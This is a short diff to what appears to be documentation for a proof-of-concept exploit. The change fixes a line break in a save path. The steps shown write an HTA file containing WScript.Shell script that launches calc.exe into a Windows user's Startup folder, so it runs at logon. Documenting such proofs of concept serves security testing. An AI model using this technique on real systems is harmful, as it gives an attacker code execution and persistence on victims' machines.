@@ -43,8 +43,7 @@ In the input box, enter the following. This will save a HTA file named **poc.hta
 
 ```
 new "<script>new ActiveXObject('WScript.Shell').run('calc.exe')</script>" vod
-save "C:\Users\sinn3r\AppData\Roaming\Microsoft\Windows\Start
-Menu\Programs\Startup\poc.hta"
+save "C:\Users\sinn3r\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\poc.hta"
 ```
 
 Note: For the startup folder's username, I'm using "sinn3r" for the demonstration. Please change this accordingly.
